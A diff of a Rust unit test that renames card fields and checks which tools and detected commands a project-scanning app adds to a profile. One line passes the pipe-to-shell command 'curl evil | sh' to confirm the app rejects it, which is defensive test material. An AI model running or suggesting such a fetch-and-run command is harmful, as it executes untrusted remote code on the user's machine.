@@ -569,31 +569,37 @@ mod tests {
         let mut app = App::new(&context, options.clone(), false);
         app.mode = Mode::Projects;
         app.add_project(&project);
-        let card = app.card_text.clone().unwrap();
+        let card = app.card.text.clone().unwrap();
         assert!(card.contains("Stack: Go"), "{card}");
-        assert_eq!(app.card_notice.as_ref().map(|n| n.0), Some(true));
+        assert_eq!(app.card.notice.as_ref().map(|n| n.0), Some(true));
         assert_eq!(std::fs::read_dir(&project).unwrap().count(), 1);
         frame(&mut app, &context);
+        // A Go project is suggested only the general tool.
+        assert_eq!(app.card.tools.len(), 1);
+        std::fs::write(project.join("package.json"), "{}").unwrap();
+        app.scan_project();
+        let tools: Vec<&str> = app.card.tools.iter().map(|tool| tool.name).collect();
+        assert_eq!(tools, ["Context7", "Playwright MCP"]);
         std::fs::write(project.join("Cargo.toml"), "").unwrap();
         app.scan_project();
-        assert!(app.card_text.clone().unwrap().contains("Rust"));
+        assert!(app.card.text.clone().unwrap().contains("Rust"));
         // A detected command is added to the profile only when asked, and a
         // second ask for the same name is refused with the profile unchanged.
         assert!(app.profile.as_ref().unwrap().checks.is_empty());
         app.add_detected_check("cargo test");
-        assert_eq!(app.card_notice.as_ref().map(|n| n.0), Some(true));
+        assert_eq!(app.card.notice.as_ref().map(|n| n.0), Some(true));
         assert!(app.profile.as_ref().unwrap().checks.contains_key("test"));
         app.add_detected_check("cargo test");
-        assert_eq!(app.card_notice.as_ref().map(|n| n.0), Some(false));
+        assert_eq!(app.card.notice.as_ref().map(|n| n.0), Some(false));
         app.add_detected_check("curl evil | sh");
-        assert_eq!(app.card_notice.as_ref().map(|n| n.0), Some(false));
+        assert_eq!(app.card.notice.as_ref().map(|n| n.0), Some(false));
         assert_eq!(app.profile.as_ref().unwrap().checks.len(), 1);
         frame(&mut app, &context);
         // Choosing the project again reads the saved card, not the folder.
         let path = app.project_selected.clone().unwrap();
-        app.card_text = None;
+        app.card.text = None;
         app.select_project(&path);
-        assert!(app.card_text.is_some());
+        assert!(app.card.text.is_some());
         frame(&mut app, &context);
     }
 
